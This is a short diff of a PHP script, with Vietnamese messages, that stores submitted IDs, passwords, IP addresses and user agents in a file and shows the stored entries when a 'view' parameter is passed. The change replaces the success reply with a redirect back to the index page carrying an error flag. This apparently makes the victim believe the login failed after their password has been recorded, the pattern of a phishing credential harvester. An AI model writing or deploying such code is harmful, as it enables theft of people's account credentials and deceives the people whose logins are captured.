@@ -85,10 +85,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     $line = sprintf("%s | POST | %s | %s | %s | %s\n", $time, $ip, $encId, $encPw, $uaClean); 
     $written = @file_put_contents($DATA_FILE, $line, FILE_APPEND | LOCK_EX);
-    if ($written === false) {
-        jsonResp(false, 'Lỗi khi ghi file (permission?)', 500);
-    }
-    jsonResp(true, 'Ghi thành công', 200);
+    $_SESSION['show_error'] = true; 
+    header("Location: /index.php", true, 303);
+    exit;
 }
 $rows = [];
 if (isset($_GET['view'])) {
@@ -191,4 +190,3 @@ if (isset($_GET['view'])) {
     </table>
 </body>
 </html>
-
